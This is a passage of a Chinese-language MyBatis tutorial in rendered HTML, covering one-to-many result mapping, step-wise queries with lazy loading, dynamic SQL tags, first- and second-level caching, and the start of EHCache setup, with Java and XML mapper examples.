class="comment">&lt;!--Dept getEmpDeptByStep(@Param(&quot;did&quot;) int did);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpDeptByStep&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Dept&quot;</span>&gt;</span></span><br><span class="line">select * from t_dept where did = #&#123;did&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-3、一对多映射处理"><a href="#8-3、一对多映射处理" class="headerlink" title="8.3、一对多映射处理"></a>8.3、一对多映射处理</h2><h3 id="8-3-1、collection"><a href="#8-3-1、collection" class="headerlink" title="8.3.1、collection"></a>8.3.1、collection</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 根据部门id查新部门以及部门中的员工信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> did</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Dept <span class="title function_">getDeptEmpByDid</span><span class="params">(<span class="meta">@Param(&quot;did&quot;)</span> <span class="type">int</span> did)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;deptEmpMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Dept&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;did&quot;</span> <span class="attr">column</span>=<span class="string">&quot;did&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;dname&quot;</span> <span class="attr">column</span>=<span class="string">&quot;dname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">ofType：设置collection标签所处理的集合属性中存储数据的类型</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;emps&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;eid&quot;</span> <span class="attr">column</span>=<span class="string">&quot;eid&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;ename&quot;</span> <span class="attr">column</span>=<span class="string">&quot;ename&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">column</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Dept getDeptEmpByDid(@Param(&quot;did&quot;) int did);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getDeptEmpByDid&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;deptEmpMap&quot;</span>&gt;</span></span><br><span class="line">select dept.*,emp.* from t_dept dept left join t_emp emp on dept.did =emp.did where dept.did = #&#123;did&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-3-2、分步查询"><a href="#8-3-2、分步查询" class="headerlink" title="8.3.2、分步查询"></a>8.3.2、分步查询</h3><h3 id="①查询部门信息"><a href="#①查询部门信息" class="headerlink" title="①查询部门信息"></a>①查询部门信息</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 分步查询部门和部门中的员工</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> did</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Dept <span class="title function_">getDeptByStep</span><span class="params">(<span class="meta">@Param(&quot;did&quot;)</span> <span class="type">int</span> did)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;deptEmpStep&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Dept&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;did&quot;</span> <span class="attr">column</span>=<span class="string">&quot;did&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;dname&quot;</span> <span class="attr">column</span>=<span class="string">&quot;dname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;emps&quot;</span> <span class="attr">fetchType</span>=<span class="string">&quot;eager&quot;</span><span class="attr">select</span>=<span class="string">&quot;com.atguigu.MyBatis.mapper.EmpMapper.getEmpListByDid&quot;</span> <span class="attr">column</span>=<span class="string">&quot;did&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Dept getDeptByStep(@Param(&quot;did&quot;) int did);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getDeptByStep&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;deptEmpStep&quot;</span>&gt;</span></span><br><span class="line">select * from t_dept where did = #&#123;did&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②根据部门id查询部门中的所有员工"><a href="#②根据部门id查询部门中的所有员工" class="headerlink" title="②根据部门id查询部门中的所有员工"></a>②根据部门id查询部门中的所有员工</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 根据部门id查询员工信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> did</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">List&lt;Emp&gt; <span class="title function_">getEmpListByDid</span><span class="params">(<span class="meta">@Param(&quot;did&quot;)</span> <span class="type">int</span> did)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--List&lt;Emp&gt; getEmpListByDid(@Param(&quot;did&quot;) int did);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpListByDid&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">select * from t_emp where did = #&#123;did&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>分步查询的优点：可以实现延迟加载</p><p>但是必须在核心配置文件中设置全局配置信息：</p><p>lazyLoadingEnabled：延迟加载的全局开关。当开启时，所有关联对象都会延迟加载</p><p>aggressiveLazyLoading：当开启时，任何方法的调用都会加载该对象的所有属性。否则，每个属性会按需加载</p><p>此时就可以实现按需加载，获取的数据是什么，就只会执行相应的sql。此时可通过association和</p><p>collection中的fetchType属性设置当前的分步查询是否使用延迟加载， fetchType&#x3D;”lazy(延迟加</p><p>载)|eager(立即加载)”</p></blockquote><h1 id="9、动态SQL"><a href="#9、动态SQL" class="headerlink" title="9、动态SQL"></a>9、动态SQL</h1><blockquote><p>Mybatis框架的动态SQL技术是一种根据特定条件动态拼装SQL语句的功能，它存在的意义是为了</p><p>解决 拼接SQL语句字符串时的痛点问题。</p></blockquote><h2 id="9-1、if"><a href="#9-1、if" class="headerlink" title="9.1、if"></a>9.1、if</h2><blockquote><p>if标签可通过test属性的表达式进行判断，若表达式的结果为true，则标签中的内容会执行；反之</p><p>标签中的内容不会执行</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--List&lt;Emp&gt; getEmpListByCondition(Emp emp);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpListByMoreTJ&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">    select * from t_emp where 1=1</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;ename != &#x27;&#x27; and ename != null&quot;</span>&gt;</span></span><br><span class="line">and ename = #&#123;ename&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span></span><br><span class="line">and age = #&#123;age&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span></span><br><span class="line">and sex = #&#123;sex&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-2、where"><a href="#9-2、where" class="headerlink" title="9.2、where"></a>9.2、where</h2><blockquote><p>where和if一般结合使用：</p><p>a&gt;若where标签中的if条件都不满足，则where标签没有任何功能，即不会添加where关键字</p><p>b&gt;若where标签中的if条件满足，则where标签会自动添加where关键字，并将条件最前方多余的</p><p>and去掉</p><p>注意：where标签不能去掉条件最后多余的and</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpListByMoreTJ2&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">select * from t_emp</span><br><span class="line"><span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;ename != &#x27;&#x27; and ename != null&quot;</span>&gt;</span></span><br><span class="line">ename = #&#123;ename&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span></span><br><span class="line">and age = #&#123;age&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span></span><br><span class="line">and sex = #&#123;sex&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-3、trim"><a href="#9-3、trim" class="headerlink" title="9.3、trim"></a>9.3、trim</h2><blockquote><p>trim用于去掉或添加标签中的内容</p><p>常用属性：</p><p>prefix：在trim标签中的内容的前面添加某些内容</p><p>prefixOverrides：在trim标签中的内容的前面去掉某些内容</p><p>suffix：在trim标签中的内容的后面添加某些内容</p><p>suffixOverrides：在trim标签中的内容的后面去掉某些内容</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpListByMoreTJ&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">select * from t_emp</span><br><span class="line"><span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">&quot;where&quot;</span> <span class="attr">suffixOverrides</span>=<span class="string">&quot;and&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;ename != &#x27;&#x27; and ename != null&quot;</span>&gt;</span></span><br><span class="line">ename = #&#123;ename&#125; and</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span></span><br><span class="line">age = #&#123;age&#125; and</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span></span><br><span class="line">sex = #&#123;sex&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-4、choose、when、otherwise"><a href="#9-4、choose、when、otherwise" class="headerlink" title="9.4、choose、when、otherwise"></a>9.4、choose、when、otherwise</h2><blockquote><p>choose、when、 otherwise相当于if…else if..else</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--List&lt;Emp&gt; getEmpListByChoose(Emp emp);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpListByChoose&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">select <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;empColumns&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include</span>&gt;</span> from t_emp</span><br><span class="line"><span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;ename != &#x27;&#x27; and ename != null&quot;</span>&gt;</span></span><br><span class="line">ename = #&#123;ename&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span></span><br><span class="line">age = #&#123;age&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span></span><br><span class="line">sex = #&#123;sex&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;email != &#x27;&#x27; and email != null&quot;</span>&gt;</span></span><br><span class="line">email = #&#123;email&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-5、foreach"><a href="#9-5、foreach" class="headerlink" title="9.5、foreach"></a>9.5、foreach</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--int insertMoreEmp(List&lt;Emp&gt; emps);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertMoreEmp&quot;</span>&gt;</span></span><br><span class="line">insert into t_emp values</span><br><span class="line"><span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;emps&quot;</span> <span class="attr">item</span>=<span class="string">&quot;emp&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">(null,#&#123;emp.ename&#125;,#&#123;emp.age&#125;,#&#123;emp.sex&#125;,#&#123;emp.email&#125;,null)</span><br><span class="line"><span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--int deleteMoreByArray(int[] eids);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteMoreByArray&quot;</span>&gt;</span></span><br><span class="line">delete from t_emp where</span><br><span class="line"><span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;eids&quot;</span> <span class="attr">item</span>=<span class="string">&quot;eid&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;or&quot;</span>&gt;</span></span><br><span class="line">eid = #&#123;eid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--int deleteMoreByArray(int[] eids);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteMoreByArray&quot;</span>&gt;</span></span><br><span class="line">delete from t_emp where eid in</span><br><span class="line"><span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;eids&quot;</span> <span class="attr">item</span>=<span class="string">&quot;eid&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">#&#123;eid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-6、SQL片段"><a href="#9-6、SQL片段" class="headerlink" title="9.6、SQL片段"></a>9.6、SQL片段</h2><blockquote><p>sql片段，可以记录一段公共sql片段，在使用的地方通过include标签进行引入</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;empColumns&quot;</span>&gt;</span></span><br><span class="line">eid,ename,age,sex,did</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line">select <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;empColumns&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include</span>&gt;</span> from t_emp</span><br></pre></td></tr></table></figure><h1 id="10、MyBatis的缓存"><a href="#10、MyBatis的缓存" class="headerlink" title="10、MyBatis的缓存"></a>10、MyBatis的缓存</h1><h2 id="10-1、MyBatis的一级缓存"><a href="#10-1、MyBatis的一级缓存" class="headerlink" title="10.1、MyBatis的一级缓存"></a>10.1、MyBatis的一级缓存</h2><p>一级缓存是SqlSession级别的，通过同一个SqlSession查询的数据会被缓存，下次查询相同的数据，就会从缓存中直接获取，不会从数据库重新访问</p><p>使一级缓存失效的四种情况：</p><ol><li><p>不同的SqlSession对应不同的一级缓存</p></li><li><p>同一个SqlSession但是查询条件不同</p></li><li><p>同一个SqlSession两次查询期间执行了任何一次增删改操作</p></li><li><p>同一个SqlSession两次查询期间手动清空了缓存</p></li></ol><h2 id="10-2、MyBatis的二级缓存"><a href="#10-2、MyBatis的二级缓存" class="headerlink" title="10.2、MyBatis的二级缓存"></a>10.2、MyBatis的二级缓存</h2><p>二级缓存是SqlSessionFactory级别，通过同一个SqlSessionFactory创建的SqlSession查询的结果会被</p><p>缓存；此后若再次执行相同的查询语句，结果就会从缓存中获取</p><p>二级缓存开启的条件：</p><p>a&gt;在核心配置文件中，设置全局配置属性cacheEnabled&#x3D;”true”，默认为true，不需要设置</p><p>b&gt;在映射文件中设置标签<cache/></p><p>c&gt;二级缓存必须在SqlSession关闭或提交之后有效</p><p>d&gt;查询的数据所转换的实体类类型必须实现序列化的接口</p><p>使二级缓存失效的情况：</p><p>两次查询之间执行了任意的增删改，会使一级和二级缓存同时失效</p><h2 id="10-3、二级缓存的相关配置"><a href="#10-3、二级缓存的相关配置" class="headerlink" title="10.3、二级缓存的相关配置"></a>10.3、二级缓存的相关配置</h2><p>在mapper配置文件中添加的cache标签可以设置一些属性：</p><p>①eviction属性：缓存回收策略，默认的是 LRU。</p><p>LRU（Least Recently Used） – 最近最少使用的：移除最长时间不被使用的对象。</p><p>FIFO（First in First out） – 先进先出：按对象进入缓存的顺序来移除它们。</p><p>SOFT – 软引用：移除基于垃圾回收器状态和软引用规则的对象。</p><p>WEAK – 弱引用：更积极地移除基于垃圾收集器状态和弱引用规则的对象。</p><p>②flushInterval属性：刷新间隔，单位毫秒</p><p>默认情况是不设置，也就是没有刷新间隔，缓存仅仅调用语句时刷新</p><p>③size属性：引用数目，正整数</p><p>代表缓存最多可以存储多少个对象，太大容易导致内存溢出</p><p>④readOnly属性：只读， true&#x2F;false</p><p>true：只读缓存；会给所有调用者返回缓存对象的相同实例。因此这些对象不能被修改。这提供了 很重要的性能优势。</p><p>false：读写缓存；会返回缓存对象的拷贝（通过序列化）。这会慢一些，但是安全，因此默认是</p><p>false。</p><h2 id="10-4、MyBatis缓存查询的顺序"><a href="#10-4、MyBatis缓存查询的顺序" class="headerlink" title="10.4、MyBatis缓存查询的顺序"></a>10.4、MyBatis缓存查询的顺序</h2><p>先查询二级缓存，因为二级缓存中可能会有其他程序已经查出来的数据，可以拿来直接使用。</p><p>如果二级缓存没有命中，再查询一级缓存</p><p>如果一级缓存也没有命中，则查询数据库</p><p>SqlSession关闭之后，一级缓存中的数据会写入二级缓存</p><h2 id="10-5、整合第三方缓存EHCache"><a href="#10-5、整合第三方缓存EHCache" class="headerlink" title="10.5、整合第三方缓存EHCache"></a>10.5、整合第三方缓存EHCache</h2><h3 id="10-5-1、添加依赖"><a href="#10-5-1、添加依赖" class="headerlink" title="10.5.1、添加依赖"></a>10.5.1、添加依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Mybatis EHCache整合包 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.caches<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-ehcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- slf4j日志门面的一个具体实现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-5-2、各jar包功能"><a href="#10-5-2、各jar包功能" class="headerlink" title="10.5.2、各jar包功能"></a>10.5.2、各jar包功能</h3><table><thead><tr><th><strong>jar包名称</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>mybatis-ehcache</td><td>Mybatis和EHCache的整合包</td></tr><tr><td>ehcache</td><td>EHCache核心包</td></tr><tr><td>slf4j-api</td><td>SLF4J日志门面包</td></tr><tr><td>logback-classic</td><td>支持SLF4J门面接口的一个具体实现</td></tr></tbody></table><h3 id="10-5-3、创建EHCache的配置文件ehcache-xml"><a href="#10-5-3、创建EHCache的配置文件ehcache-xml" class="headerlink" title="10.5.3、创建EHCache的配置文件ehcache.xml"></a>10.5.3、创建EHCache的配置文件ehcache.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 